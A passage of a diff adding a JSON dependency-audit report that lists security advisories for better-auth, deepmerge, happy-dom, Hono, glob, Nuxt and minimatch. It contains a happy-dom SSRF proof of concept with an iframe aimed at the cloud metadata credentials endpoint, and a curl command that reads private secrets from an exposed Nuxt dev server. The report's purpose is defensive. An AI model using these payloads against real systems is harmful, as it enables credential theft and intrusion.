OAuth or SAML state flow and all OAuth Proxy participants together, including the production coordinator and preview or development deployments. Keep installed Better Auth packages released alongside `better-auth` on the same release version. Restart pending sign-in and account-linking flows; pre-upgrade state cookies and proxy payloads are rejected. Public options and API signatures are unchanged.\n\n## Workarounds\n\nUntil you upgrade to the fixed release, apply one of these:\n\n- Set one strong OAuth Proxy `secret` across every environment that takes part in the proxy flow, and keep it different from each environment's global Better Auth secret.\n- Set `account.storeStateStrategy: \"database\"`. This is already the default when a database or secondary storage is configured. If Magic Link is also enabled, switching can expose a separate cross-purpose verification-record path in affected releases. Ensure the two flows resolve to distinct stored identifiers; with built-in options, use Magic Link `storeToken: \"hashed\"` with global `verification.storeIdentifier` unset or `\"plain\"`, or disable Magic Link or both built-in social and Generic OAuth sign-in.\n- Remove the OAuth Proxy plugin if you do not need it.\n\nSetting `account.accountLinking.disableImplicitLinking: true` stops this path from taking over an existing account. It does not fix the underlying flaw: the callback can still accept attacker-made data as a provider identity. Apply one of the steps above as well.",
+      "reported_by": null,
+      "title": "better-auth: OAuth Proxy lets an attacker sign in as another user",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "better-auth",
+      "vulnerable_versions": ">=1.5.0-beta.12 <1.7.7",
+      "github_advisory_id": "GHSA-r4xp-prcw-77qf",
+      "recommendation": "Upgrade to version 1.7.7 or later",
+      "patched_versions": ">=1.7.7",
+      "updated": "2026-10-27T15:32:17.000Z",
+      "cvss": {
+        "score": 7.4,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-287",
+        "CWE-345"
+      ],
+      "url": "https://github.com/advisories/GHSA-r4xp-prcw-77qf"
+    },
+    "1243467": {
+      "findings": [
+        {
+          "version": "1.6.14",
+          "paths": [
+            "apps__api>better-auth"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/better-auth/better-auth/security/advisories/GHSA-965c-763c-88jm\n- https://nvd.nist.gov/vuln/detail/CVE-2026-114607\n- https://github.com/better-auth/better-auth/pull/11494\n- https://github.com/better-auth/better-auth/commit/ac54bfd67821a7607533af2059858b12bc54e26a\n- https://github.com/better-auth/better-auth/releases/tag/v1.7.7\n- https://github.com/advisories/GHSA-965c-763c-88jm",
+      "created": "2026-10-27T15:32:05.000Z",
+      "id": 1243467,
+      "npm_advisory_id": null,
+      "overview": "## Am I affected?\n\nYou may be affected if you use `better-auth` from `1.4.0-beta.18` through versions before `1.7.7` with the Magic Link plugin and social or Generic OAuth sign-in.\n\nYou are affected if **all** of these are true:\n\n- Magic Link is enabled with default `storeToken: \"plain\"`, or with `storeToken: \"hashed\"` and global `verification.storeIdentifier: \"hashed\"` (including a hashed default).\n- At least one built-in social provider or Generic OAuth provider is enabled.\n- OAuth state uses `account.storeStateStrategy: \"database\"`, the default when a database or secondary storage is configured.\n\nCookie-backed state blocks this path, subject to the OAuth Proxy condition below. With custom hashers, confirm the flows cannot resolve to the same stored identifier.\n\n## Summary\n\nBetter Auth accepts an OAuth sign-in state value as a Magic Link token. An attacker can start an OAuth sign-in with any email address and use the returned state value to finish a Magic Link sign-in for that address. They never prove that they can read that email.\n\n## Impact\n\nAn unauthenticated attacker who knows a user's email address can get a normal session for that user, with all of that account's permissions. They need no access to the mailbox, and they do not need to sign in with the OAuth provider or complete an OAuth callback.\n\nIf Magic Link sign-up is enabled and no user has the email address, the attacker can instead create an account that Better Auth wrongly marks as email verified, and is signed in to it. The false verified-email flag can also bypass Better Auth's default unproven-account protections when the mailbox owner later signs in, leaving the attacker's session in that account. Applications that trust verified email addresses or email domains may give this account more access, depending on the application.\n\n## Patches\n\nThe fix is merged for the planned `better-auth` 1.7.7 release. That package is not available yet.\n\nUpgrade `better-auth` and installed Better Auth adapters, plugins, and integrations released alongside it together. Upgrade servers sharing verification storage in the same cutover. Request new Magic Links and restart pending OAuth or SAML sign-ins; links and state created before the upgrade cannot complete. Update custom `verification.storeIdentifier.overrides` rules to match the `magic-link:` and `auth-state:` prefixes. There is no user or account data migration, and public token values and API signatures are unchanged.\n\n## Workarounds\n\nUntil you upgrade to the fixed release, use one of these mitigations:\n\n- Set `account.storeStateStrategy` to `\"cookie\"`. If you also use OAuth Proxy, first configure one dedicated OAuth Proxy `secret` across all participating environments that differs from each environment's global Better Auth secret. Cookie-backed state can expose a separate OAuth Proxy account-takeover path when the proxy shares the global secret and implicit account linking is enabled.\n- Set the Magic Link plugin option `storeToken` to `\"hashed\"` **and** leave global `verification.storeIdentifier` unset or set it to `\"plain\"`. Global identifier hashing does not prevent this issue when Magic Link tokens are also hashed.\n- Turn off Magic Link sign-in, or turn off social and Generic OAuth sign-in.\n\nSetting `disableSignUp: true` on the Magic Link plugin is not enough. It only stops the creation of new verified accounts. It does not stop the takeover of existing accounts.",
+      "reported_by": null,
+      "title": "better-auth: OAuth state can be used as a Magic Link to sign in as another user",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-114607"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "better-auth",
+      "vulnerable_versions": ">=1.4.0-beta.18 <1.7.7",
+      "github_advisory_id": "GHSA-965c-763c-88jm",
+      "recommendation": "Upgrade to version 1.7.7 or later",
+      "patched_versions": ">=1.7.7",
+      "updated": "2026-10-27T15:32:09.000Z",
+      "cvss": {
+        "score": 9.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-287"
+      ],
+      "url": "https://github.com/advisories/GHSA-965c-763c-88jm"
+    },
+    "1243505": {
+      "findings": [
+        {
+          "version": "4.3.1",
+          "paths": [
+            "apps__web>nuxt>@nuxt/nitro-server>nitropack>@rollup/plugin-node-resolve>deepmerge"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-93753\n- https://github.com/TehShrike/deepmerge/issues/273\n- https://github.com/TehShrike/deepmerge/blob/5b87756a5671635679001cbac72aa42f23472c81/index.js#L39-L60\n- https://www.vulncheck.com/advisories/deepmerge-through-4.3.1-prototype-poisoning-via-mergeobject\n- https://github.com/advisories/GHSA-gcqx-w48m-w2h4",
+      "created": "2026-09-18T18:31:44.000Z",
+      "id": 1243505,
+      "npm_advisory_id": null,
+      "overview": "deepmerge through 4.3.1 contains a prototype poisoning vulnerability in the mergeObject() function that fails to properly validate keys being written to target objects. Attackers can supply malicious source objects in merge operations to inject attacker-controlled properties into the returned object's prototype, causing applications to inherit unintended values when accessing properties without own-property checks.",
+      "reported_by": null,
+      "title": "deepmerge mergeObject() allows prototype poisoning of returned objects",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-93753"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "deepmerge",
+      "vulnerable_versions": ">=4.2.0 <=4.3.1",
+      "github_advisory_id": "GHSA-gcqx-w48m-w2h4",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-10-27T21:34:58.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-gcqx-w48m-w2h4"
+    },
+    "1243623": {
+      "findings": [
+        {
+          "version": "20.14.6",
+          "paths": [
+            "apps__web>happy-dom"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/capricorn86/happy-dom/security/advisories/GHSA-c8p4-j97h-3vg8\n- https://github.com/capricorn86/happy-dom/pull/2502\n- https://github.com/capricorn86/happy-dom/commit/0a99c7525a1d0043e3182843ae33466ab7b19e74\n- https://github.com/capricorn86/happy-dom/releases/tag/v21.0.0\n- https://github.com/advisories/GHSA-c8p4-j97h-3vg8",
+      "created": "2026-10-28T21:06:42.000Z",
+      "id": 1243623,
+      "npm_advisory_id": null,
+      "overview": "## Summary\nhappy-dom v20.8.9 makes real server-side HTTP requests to arbitrary URLs when parsing HTML containing `<iframe>` or `<link rel=\"stylesheet\">` elements. This behavior is enabled by default (`disableIframePageLoading: false`, `disableCSSFileLoading: false`). When an application uses happy-dom to parse untrusted HTML on the server side, an attacker can trigger Server-Side Request Forgery by embedding these elements.\n\n## Affected Versions\n- happy-dom <= 20.8.9 (latest)\n\n## Vulnerable Behavior\n\nBy default, happy-dom has:\n- `disableIframePageLoading: false` ??? iframes fetch their `src` URL via real HTTP requests\n- `disableCSSFileLoading: false` ??? `<link>` stylesheets fetch their `href` URL via real HTTP requests\n\nWhen untrusted HTML is parsed, these elements trigger real server-side HTTP requests to whatever URLs are specified. No special configuration or opt-in is needed.\n\n## Proof of Concept\n\n### Verified test (attacker server receives requests):\n```javascript\nconst http = require('http');\nconst { Window } = require('happy-dom');\n\n// Start attacker server\nconst srv = http.createServer((req, res) => {\n    console.log(`SSRF HIT: ${req.method} ${req.url}`);\n    res.writeHead(200, {'Content-Type': 'text/html'});\n    res.end('<html><body>stolen</body></html>');\n});\n\nsrv.listen(9995, () => {\n    // iframe SSRF ??? happy-dom makes a real GET request\n    const win1 = new Window({ url: 'http://localhost' });\n    win1.document.write('<html><body><iframe src=\"http://127.0.0.1:9995/iframe-ssrf\"></iframe></body></html>');\n\n    // stylesheet SSRF ??? happy-dom makes a real GET request\n    const win2 = new Window({ url: 'http://localhost' });\n    win2.document.write('<html><head><link rel=\"stylesheet\" href=\"http://127.0.0.1:9995/stylesheet-ssrf\"></head><body></body></html>');\n});\n```\n\n**Test output:**\n```\nSSRF HIT: GET /iframe-ssrf\nSSRF HIT: GET /stylesheet-ssrf\n```\n\nBoth requests confirmed received by the attacker server. Tested on happy-dom v20.8.9, Node.js v22.17.0, macOS.\n\n### Cloud metadata attack scenario:\n```javascript\nconst { Window } = require('happy-dom');\nconst win = new Window({ url: 'http://localhost' });\n\n// Attacker-controlled HTML triggers fetch to AWS metadata endpoint\nwin.document.write('<html><body><iframe src=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"></iframe></body></html>');\n```\n\n## Impact\n- **Cloud credential theft** ??? `<iframe src=\"http://169.254.169.254/...\">` fetches AWS/GCP/Azure metadata\n- **Internal network scanning** ??? probe internal services and ports\n- **Data exfiltration** ??? read responses from internal APIs\n- **Affects any server-side use case** ??? web scraping, email HTML rendering, SSR, testing with external HTML input\n\n## Suggested Fix\nChange defaults to disable external resource loading:\n```javascript\ndisableIframePageLoading: true,  // change from false\ndisableCSSFileLoading: true,     // change from false\n```\n\nOr add URL validation to block private IP ranges and cloud metadata endpoints before fetching.",
+      "reported_by": null,
+      "title": "Happy DOM: SSRF via iframe and link stylesheet when parsing untrusted HTML",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-118660"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "happy-dom",
+      "vulnerable_versions": "<=20.14.6",
+      "github_advisory_id": "GHSA-c8p4-j97h-3vg8",
+      "recommendation": "Upgrade to version 21.0.0 or later",
+      "patched_versions": ">=21.0.0",
+      "updated": "2026-10-28T21:06:43.000Z",
+      "cvss": {
+        "score": 8.6,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-c8p4-j97h-3vg8"
+    },
+    "1243661": {
+      "findings": [
+        {
+          "version": "1.19.18",
+          "paths": [
+            "apps__api>@hono/node-server"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/node-server/security/advisories/GHSA-rmxm-3fg6-px4f\n- https://github.com/honojs/node-server/commit/982179278529d5673812116b042829f27794966f\n- https://github.com/honojs/node-server/releases/tag/v2.1.3\n- https://github.com/advisories/GHSA-rmxm-3fg6-px4f",
+      "created": "2026-10-28T21:05:00.000Z",
+      "id": 1243661,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`serveStatic` decodes the request path a second time after Hono has already decoded it for routing. A crafted request can be routed as one path and served as another, so middleware mounted on a static prefix does not run for a file under that prefix.\n\n### Details\n\nHono decodes the request path once before routing. `serveStatic` decoded it again before resolving the file. With a malformed percent-encoded sequence, the first decode leaves part of the path encoded, the router matches the encoded form, and the second decode resolves the real directory. The file is still resolved inside the configured root; this is not a traversal outside it.\n\n### Impact\n\nAn unauthenticated attacker may reach static files without the middleware on their prefix running, for example an authentication check. This affects applications that mount middleware on part of the directory served by `serveStatic`. Applications that serve only public files are not affected.",
+      "reported_by": null,
+      "title": "@hono/node-server: `serveStatic` decodes the request path a second time, leading to bypass of middleware on static paths",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-118663"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@hono/node-server",
+      "vulnerable_versions": ">=1.19.10 <2.1.3",
+      "github_advisory_id": "GHSA-rmxm-3fg6-px4f",
+      "recommendation": "Upgrade to version 2.1.3 or later",
+      "patched_versions": ">=2.1.3",
+      "updated": "2026-10-28T21:05:02.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-174"
+      ],
+      "url": "https://github.com/advisories/GHSA-rmxm-3fg6-px4f"
+    },
+    "1244013": {
+      "findings": [
+        {
+          "version": "10.5.0",
+          "paths": [
+            ".>@cyclonedx/cyclonedx-npm>libxmljs2>node-gyp>make-fetch-happen>cacache>glob"
+          ]
+        },
+        {
+          "version": "13.0.6",
+          "paths": [
+            "apps__web>@vue/test-utils>js-beautify>glob"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-glob/security/advisories/GHSA-3g3m-2fjr-6pw4\n- https://nvd.nist.gov/vuln/detail/CVE-2026-118773\n- https://github.com/isaacs/node-glob/commit/4682e8c9babee1b385202ede36389634e12076d7\n- https://github.com/isaacs/node-glob/releases/tag/v14.0.2\n- https://github.com/advisories/GHSA-3g3m-2fjr-6pw4",
+      "created": "2026-10-30T23:09:11.000Z",
+      "id": 1244013,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nIn glob 13.0.6, an aborted async walk rejects or emits an error but continues recursively reading directories in the background.\n\nThe root cause is that abort branches in src/walker.ts call cb() without returning. As a result, callers that rely on signal or AbortSignal.timeout() to bound glob traversal cost can still incur filesystem I/O and CPU work after the request has already been rejected.\n\n### Details\n\nThis was reproduced on glob v13.0.6 (commit e80cb38ae60d6cbff9e75f39032a994858994d35).\n\nThe README documents that the signal option cancels the glob walk. However, in src/walker.ts, the following methods call cb() when this.signal?.aborted is true but do not return:\n\n- GlobUtil.walkCB()\n- GlobUtil.walkCB2()\n- GlobUtil.walkCBSync()\n- GlobUtil.walkCB2Sync()\n\nExample vulnerable pattern:\n\nif (this.signal?.aborted) cb()\n\nBecause execution continues after cb(), the walker still reaches processor.processPatterns(), readdirCB(), and recursive walkCB2() calls.\n\nThe issue was directly demonstrated against v13.0.6. A source-history review shows the same missing-return pattern is present in tagged releases from v9.0.0 through v13.0.6.\n\nThe issue affects both glob() and globStream().\n\nRecommended fix:\nChange each abort branch to return immediately:\n\nif (this.signal?.aborted) return cb()\n\n### Proof of concept\n\nEnvironment:\n- Linux x86_64\n- Node.js v22.23.3\n- npm 10.9.9\n- glob 13.0.6\n\nReproduction steps:\n\n1. Install the affected package:\n   npm init -y\n   npm install glob@13.0.6\n\n2. Run the attached PoC:\n   node poc/abort-continues-work.mjs\n\nThe PoC aborts after the first readdir() call, waits briefly, and counts how many more directory reads happen after the promise has already rejected.\n\nObserved output on the vulnerable version:\n\n{\n  \"rejection\": \"Error: probe-abort\",\n  \"readdirCalls\": 1365,\n  \"readdirCallsAtReject\": 5,\n  \"readdirCallsAfterReject\": 1360\n}\n\nExpected behavior:\nreaddirCallsAfterReject should be 0.\n\nA second PoC using AbortSignal.timeout() also reproduces the issue:\n\n{\n  \"rejection\": \"TimeoutError: The operation was aborted due to timeout\",\n  \"readdirCalls\": 133,\n  \"readdirCallsAtReject\": 1,\n  \"readdirCallsAfterReject\": 132\n}\n\nThe same test against a patched build with return cb() in the four abort branches stops immediately:\n\n{\n  \"readdirCalls\": 1,\n  \"readdirCallsAtReject\": 1,\n  \"readdirCallsAfterReject\": 0\n}\n\n### Impact\n\nThis is an availability issue.\n\nApplications that expose globbing over attacker-influenced patterns or attacker-controlled directory trees and use AbortSignal / AbortSignal.timeout() as a traversal budget can still perform significant filesystem I/O and CPU work after a request has already timed out or been canceled.\n\nRepeated timed-out requests can stack background glob walks and degrade worker throughput or service availability.\n\nNo confidentiality or integrity impact was observed.",
+      "reported_by": null,
+      "title": "Glob: AbortSignal cancellation bypass allows post-timeout filesystem traversal",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-118773"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "glob",
+      "vulnerable_versions": ">=9.0.0 <=14.0.1",
+      "github_advisory_id": "GHSA-3g3m-2fjr-6pw4",
+      "recommendation": "Upgrade to version 14.0.2 or later",
+      "patched_versions": ">=14.0.2",
+      "updated": "2026-10-30T23:09:15.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-3g3m-2fjr-6pw4"
+    },
+    "1244029": {
+      "findings": [
+        {
+          "version": "4.5.2",
+          "paths": [
+            "apps__web>nuxt>@nuxt/vite-builder"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nuxt/nuxt/security/advisories/GHSA-648h-gw55-m2g7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-119199\n- https://github.com/nuxt/nuxt/commit/12b58f9d8768682611c3ad4ea4d403875129dbca\n- https://github.com/nuxt/nuxt/releases/tag/v4.6.3\n- https://github.com/advisories/GHSA-648h-gw55-m2g7",
+      "created": "2026-10-30T23:00:43.000Z",
+      "id": 1244029,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nWith Nitro 2 (the default server engine in Nuxt 3 and Nuxt 4), the Nitro development server bundle written by `nuxt dev` can be fetched through the Vite dev server. Nitro inlines the resolved `runtimeConfig` into that bundle, so private runtime config values that were resolved at build time can be read by anyone with HTTP access to the dev server.\n\n### Impact\n\n`nuxt dev` writes the Nitro development server bundle to `<buildDir>/dev/index.mjs` (by default `.nuxt/dev/index.mjs`). The build directory is inside the directories Nuxt passes to Vite's `server.fs.allow`, so the bundle is served by the dev server:\n\n```bash\ncurl http://<dev-server>/_nuxt/@fs/<absolute-path-to-project>/.nuxt/dev/index.mjs\n```\n\nThe response contains every private (non-`public`) runtime config value that was resolved at build time. That includes values set in `nuxt.config`, such as a secret read from `.env`:\n\n```ts\nexport default defineNuxtConfig({\n  runtimeConfig: {\n    apiSecret: process.env.API_SECRET,\n  },\n})\n```\n\nFrom Nuxt 4.6.0, it also includes the generated development `appSecret`. Vite's default deny list blocks `.env` itself, but not the bundle containing values read from it.\n\nExploitation requires direct HTTP access to the dev server. `nuxt dev` listens on localhost by default, so this mainly affects dev servers that are exposed to a network (for example with `--host`, a published container port or a tunnel). As far as we can tell, a malicious website cannot read the file through a developer's browser: Vite's CORS and host checks prevent pages on other origins from reading the response.\n\nProduction builds are not affected, because the Vite dev server is not used and the server bundle is not served. Nuxt projects using Nitro 3 do not write the server bundle to disk in development and are not affected. Private runtime config values that are left empty in `nuxt.config` and supplied through `NUXT_*` environment variables are applied when the server starts, are not inlined into the bundle, and are not exposed.\n\n### Patches\n\nFixed in `@nuxt/vite-builder` 4.6.3, which `nuxt` 4.6.3 depends on. The dev server now adds Nitro's development output directory to Vite's `server.fs.deny`, keeping Vite's default deny list.\n\nNuxt 3 has reached end of life and will not receive a fix.\n\n### Workarounds\n\nAvoid exposing the dev server to untrusted networks. Alternatively, set private runtime config keys to an empty default in `nuxt.config` and provide their values with the matching `NUXT_*` environment variables (for example `runtimeConfig: { apiSecret: '' }` with `NUXT_API_SECRET` in `.env`).\n\nIf a dev server has been reachable by untrusted clients, rotate any credentials that were set through `runtimeConfig` in `nuxt.config`.",
+      "reported_by": null,
+      "title": "Nuxt dev server exposes private runtime config through the Nitro dev bundle",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-119199"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@nuxt/vite-builder",
+      "vulnerable_versions": ">=3.0.0 <4.6.3",
+      "github_advisory_id": "GHSA-648h-gw55-m2g7",
+      "recommendation": "Upgrade to version 4.6.3 or later",
+      "patched_versions": ">=4.6.3",
+      "updated": "2026-10-30T23:00:44.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-200",
+        "CWE-538",
+        "CWE-552"
+      ],
+      "url": "https://github.com/advisories/GHSA-648h-gw55-m2g7"
+    },
+    "1244623": {
+      "findings": [
+        {
+          "version": "9.0.9",
+          "paths": [
+            ".>@cyclonedx/cyclonedx-npm>libxmljs2>node-gyp>make-fetch-happen>cacache>glob>minimatch"
+          ]
+        },
+        {
+          "version": "10.2.6",
+          "paths": [
+            ".>@vitest/coverage-v8>test-exclude>minimatch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/minimatch/security/advisories/GHSA-g3hv-75wg-m249\n- https://nvd.nist.gov/vuln/detail/CVE-2026-118764\n- https://github.com/isaacs/minimatch/commit/77a0f5c4b80bdc641c3c930a1d9edf5ad2db57f8\n- https://github.com/isaacs/minimatch/releases/tag/v11.0.1\n- https://github.com/isaacs/minimatch/commit/297b6c1a01f2410b3ba1ebed14ba222d0c3c1033\n- https://github.com/isaacs/minimatch/commit/fd0b3ab9cbc5bf1aff1c99f1f46e413c2b3340da\n- https://github.com/advisories/GHSA-g3hv-75wg-m249",
+      "created": "2026-10-30T23:09:55.000Z",
+      "id": 1244623,
+      "npm_advisory_id": null,
+      "overview": "minimatch 10.2.6 contains an attacker-controlled pattern amplification in firstPhasePreProcess() when optimizationLevel >= 2.\n\nresearcher: Reid Downing (b1nv0id)\nfiles: \n\n- src/index.ts: 690-770\n- src/index.ts: 780-796\n\nissue:\ninput-controlled growth of globParts during first-phase preprocessing, followed by quadratic second-phase processing.\n\nthe **/../ transformation clones a globparts entry and appends the clone to the same globparts array:\n```\nparts.splice(gs, 1)\nconst other = parts.slice(0)\nother[gs] = '**'\nglobParts.push(other)\n```\nthis occurs inside a do...while (didSomething) fixpoint loop, allowing generated entries to be processed again.\n\nthe expanded globparts array is subsequently processed by secondPhasePreProcess(), which performs pairwise comparisons:\n```\nfor (let i = 0; i < globParts.length - 1; i++) {\n  for (let j = i + 1; j < globParts.length; j++) {\n    this.partsMatch(...)\n  }\n}\n```\nan attacker who can supply a glob pattern can therefore cause additional pattern entries to be generated during preprocessing, followed by quadratic pairwise processing, resulting in excessive cpu and memory consumption.",
+      "reported_by": null,
+      "title": "minimatch has potential denial of service via globparts amplification",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-118764"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "minimatch",
+      "vulnerable_versions": ">=7.0.0 <11.0.1",
+      "github_advisory_id": "GHSA-g3hv-75wg-m249",
+      "recommendation": "Upgrade to version 11.0.1 or later",
+      "patched_versions": ">=11.0.1",
+      "updated": "2026-11-04T16:50:04.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-405"
+      ],
+      "url": "https://github.com/advisories/GHSA-g3hv-75wg-m249"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 3,
+      "moderate": 15,
+      "high": 8,
+      "critical": 3
+    },
+    "dependencies": 1292,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1292
+  }
+}
